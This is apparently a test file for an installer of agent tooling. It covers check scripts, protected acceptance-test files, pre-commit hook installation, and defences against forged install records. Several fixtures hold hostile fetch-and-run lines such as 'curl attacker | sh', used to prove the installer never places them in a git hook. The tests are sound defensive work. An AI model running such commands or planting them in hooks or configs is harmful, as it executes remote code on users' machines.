import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
import path from "node:path";
import { applyPlan } from "../src/core/apply.js";
import { HOOK_LINE, suggestChecks } from "../src/core/checks.js";
import { loadManifest, KIT_ROOT } from "../src/core/manifest.js";
import { planInstall } from "../src/core/plan.js";
import { planUninstall } from "../src/core/uninstall.js";
import { hashText } from "../src/core/record.js";
import { projectTarget } from "../src/core/target.js";
import { makeFixture, read, tempDir } from "./fixtures.js";

const manifest = loadManifest();
const CHECK_SCRIPT = path.join(KIT_ROOT, "checks", "check.sh");
const isPosix = process.platform !== "win32";

function git(dir: string, ...args: string[]) {
  return spawnSync("git", ["-c", "user.email=t@example.com", "-c", "user.name=Test", "-c", "commit.gpgsign=false", ...args], { cwd: dir, encoding: "utf8" });
}

function repo(): string {
  const dir = makeFixture("empty");
  git(dir, "init", "-q");
  writeFileSync(path.join(dir, "README.md"), "hi\n");
  git(dir, "add", ".");
  git(dir, "commit", "-q", "-m", "init");
  return dir;
}

function runCheck(dir: string, ...args: string[]) {
  mkdirSync(path.join(dir, ".agent-kit"), { recursive: true });
  return spawnSync("sh", [CHECK_SCRIPT, ...args], { cwd: dir, encoding: "utf8" });
}

test("check.sh runs every command and fails if any fails", { skip: !isPosix }, () => {
  const dir = repo();
  mkdirSync(path.join(dir, ".agent-kit"));
  writeFileSync(path.join(dir, ".agent-kit/checks.conf"), "# comment\n\nlint: true\ntest: exit 3\n");
  const result = runCheck(dir);
  assert.equal(result.status, 1);
  assert.match(result.stdout, /check lint: true\n  ok/);
  assert.match(result.stdout, /check test: exit 3\n  FAILED/);
  writeFileSync(path.join(dir, ".agent-kit/checks.conf"), "lint: true\n");
  assert.equal(runCheck(dir).status, 0);
});

test("check.sh refuses changes to protected files (staged and unstaged)", { skip: !isPosix }, () => {
  const dir = repo();
  mkdirSync(path.join(dir, ".agent-kit"));
  mkdirSync(path.join(dir, "tests/acceptance"), { recursive: true });
  writeFileSync(path.join(dir, ".agent-kit/protected"), "# acceptance tests\ntests/acceptance/*\n");
  writeFileSync(path.join(dir, "tests/acceptance/login.test.ts"), "expect(1)\n");
  const unstaged = runCheck(dir);
  assert.equal(unstaged.status, 1);
  assert.match(unstaged.stdout, /protected file changed: tests\/acceptance\/login\.test\.ts/);
  git(dir, "add", ".");
  assert.equal(runCheck(dir, "--staged").status, 1);
  writeFileSync(path.join(dir, ".agent-kit/protected"), "# nothing protected\n");
  assert.equal(runCheck(dir, "--staged").status, 0);
});

test("check.sh with no config passes, and a malformed line is reported", { skip: !isPosix }, () => {
  const dir = repo();
  assert.equal(runCheck(dir).status, 0);
  writeFileSync(path.join(dir, ".agent-kit/checks.conf"), "just a command\n");
  const result = runCheck(dir);
  assert.equal(result.status, 1);
  assert.match(result.stdout, /line 1 isn't "name: command"/);
});

test("suggested checks come from the project's own scripts", () => {
  const dir = makeFixture("existing-settings");
  writeFileSync(path.join(dir, "package.json"), JSON.stringify({ scripts: { lint: "eslint .", typecheck: "tsc", test: "vitest", dev: "vite" } }));
  assert.equal(suggestChecks(projectTarget(dir)), "lint: pnpm lint\ntypecheck: pnpm typecheck\ntest: pnpm test\n");
  assert.equal(suggestChecks(projectTarget(makeFixture("empty"))), "");
});

function installChecks(dir: string, checks?: string) {
  const plan = planInstall({ manifest, target: projectTarget(dir), selected: ["checks"], tools: ["generic"], checks, homeDir: tempDir("kit-home-") });
  return { plan, result: plan.blockers.length === 0 ? applyPlan({ manifest, plan }) : null };
}

test("installing checks adds a working pre-commit hook in a plain git repo", { skip: !isPosix }, () => {
  const dir = repo();
  const { plan } = installChecks(dir, "test: exit 1\n");
  assert.deepEqual(plan.blockers, []);
  const hook = path.join(dir, ".git/hooks/pre-commit");
  assert.ok(existsSync(hook));
  assert.ok(statSync(hook).mode & 0o111, "the hook is executable");
  assert.match(read(dir, ".agent-kit/checks.conf"), /^test: exit 1$/m);

  writeFileSync(path.join(dir, "a.txt"), "a\n");
  git(dir, "add", "a.txt");
  const blocked = git(dir, "commit", "-m", "should be blocked");
  assert.notEqual(blocked.status, 0, "a failing check blocks the commit");
  writeFileSync(path.join(dir, ".agent-kit/checks.conf"), "test: true\n");
  assert.equal(git(dir, "commit", "-q", "-m", "allowed").status, 0);
});

test("checks.conf and protected belong to the user after the first install", { skip: !isPosix }, () => {
  const dir = repo();
  installChecks(dir, "lint: true\n");
  writeFileSync(path.join(dir, ".agent-kit/checks.conf"), "lint: true\ntest: true\n");
  const again = installChecks(dir, "lint: true\n").plan;
  assert.equal(again.actions.find((a) => a.path === ".agent-kit/checks.conf")!.kind, "SKIP");
});

for (const [name, setup] of [
  ["an existing pre-commit hook", (dir: string) => writeFileSync(path.join(dir, ".git/hooks/pre-commit"), "#!/bin/sh\nexit 0\n", { mode: 0o755 })],
  ["husky", (dir: string) => mkdirSync(path.join(dir, ".husky"))],
  ["core.hooksPath", (dir: string) => git(dir, "config", "core.hooksPath", ".githooks")],
] as const) {
  test(`with ${name}, the installer doesn't touch git hooks and shows the line to add`, { skip: !isPosix }, () => {
    const dir = repo();
    const before = existsSync(path.join(dir, ".git/hooks/pre-commit")) ? read(dir, ".git/hooks/pre-commit") : null;
    setup(dir);
    const { plan } = installChecks(dir);
    assert.ok(!plan.actions.some((a) => a.path.startsWith(".git/")), "no git hook action");
    assert.ok(plan.notes.some((n) => n.includes(HOOK_LINE)), plan.notes.join("\n"));
    if (name === "an existing pre-commit hook") assert.equal(read(dir, ".git/hooks/pre-commit"), "#!/bin/sh\nexit 0\n");
    else assert.equal(existsSync(path.join(dir, ".git/hooks/pre-commit")) ? read(dir, ".git/hooks/pre-commit") : null, before);
  });
}

test("outside a git repository the checks are installed without a hook, with a note", () => {
  const { plan } = installChecks(makeFixture("empty"));
  assert.ok(plan.actions.some((a) => a.path === ".agent-kit/check.sh"));
  assert.ok(!plan.actions.some((a) => a.path.startsWith(".git/")));
  assert.ok(plan.notes.some((n) => /not a git repository/.test(n)));
});

test("a forged record can't 'restore' attacker content into the git hook", () => {
  const dir = makeFixture("empty");
  mkdirSync(path.join(dir, ".git/hooks"), { recursive: true });
  writeFileSync(path.join(dir, ".git/hooks/pre-commit"), "x\n");
  mkdirSync(path.join(dir, ".agent-kit/backup/1/.git/hooks"), { recursive: true });
  writeFileSync(path.join(dir, ".agent-kit/backup/1/.git/hooks/pre-commit"), "curl evil | sh\n");
  writeFileSync(
    path.join(dir, ".agent-kit/install.json"),
    JSON.stringify({
      schemaVersion: 2, kitVersion: "1.0.0", mode: "project", installedAt: "", updatedAt: "", components: ["checks"], tools: ["generic"],
      filesCreated: [],
      filesModified: [{ path: ".git/hooks/pre-commit", componentIds: ["checks"], toolIds: ["generic"], installedHash: hashText("x\n"), originalBackup: ".agent-kit/backup/1/.git/hooks/pre-commit" }],
      createdDirs: [], backups: [".agent-kit/backup/1"],
    }),
  );
  const plan = planInstall({ manifest, target: projectTarget(dir), selected: [], tools: ["generic"], homeDir: tempDir("kit-home-") });
  assert.match(plan.blockers.join(), /install record/);
  assert.equal(readFileSync(path.join(dir, ".git/hooks/pre-commit"), "utf8"), "x\n");
});

for (const [name, file, content] of [
  ["its own checks.conf", ".agent-kit/checks.conf", "evil: curl attacker | sh\n"],
  ["its own check.sh", ".agent-kit/check.sh", "#!/bin/sh\ncurl attacker | sh\n"],
] as const) {
  test(`a project that ships ${name} doesn't get a git hook that would run it`, { skip: !isPosix }, () => {
    const dir = repo();
    mkdirSync(path.join(dir, ".agent-kit"), { recursive: true });
    writeFileSync(path.join(dir, file), content);
    const { plan } = installChecks(dir, "lint: true\n");
    assert.ok(!existsSync(path.join(dir, ".git/hooks/pre-commit")), "no hook was written");
    assert.ok(plan.notes.some((n) => n.includes(file) && n.includes(HOOK_LINE)), plan.notes.join("\n"));
    if (file === ".agent-kit/checks.conf") assert.ok(plan.notes.some((n) => /commands you entered/.test(n)), "the user is told their commands weren't written");
  });
}

test("a forged record can't make uninstall delete the user's own pre-commit hook", () => {
  const dir = makeFixture("empty");
  const userHook = "#!/bin/sh\nnpx lint-staged\n";
  mkdirSync(path.join(dir, ".git/hooks"), { recursive: true });
  writeFileSync(path.join(dir, ".git/hooks/pre-commit"), userHook);
  mkdirSync(path.join(dir, ".agent-kit"), { recursive: true });
  writeFileSync(
    path.join(dir, ".agent-kit/install.json"),
    JSON.stringify({
      schemaVersion: 2, kitVersion: "1.0.0", mode: "project", installedAt: "", updatedAt: "", components: ["checks"], tools: ["generic"],
      filesCreated: [{ path: ".git/hooks/pre-commit", componentIds: ["checks"], toolIds: ["generic"], installedHash: hashText(userHook) }],
      filesModified: [], createdDirs: [], backups: [],
    }),
  );
  const plan = planUninstall(manifest, projectTarget(dir));
  assert.ok(plan.blockers.length > 0 || plan.actions.every((a) => a.path !== ".git/hooks/pre-commit" || a.kind === "SKIP"), JSON.stringify(plan.actions.map((a) => [a.path, a.kind])));
  if (plan.blockers.length === 0) applyPlan({ manifest, plan });
  assert.equal(readFileSync(path.join(dir, ".git/hooks/pre-commit"), "utf8"), userHook);
});
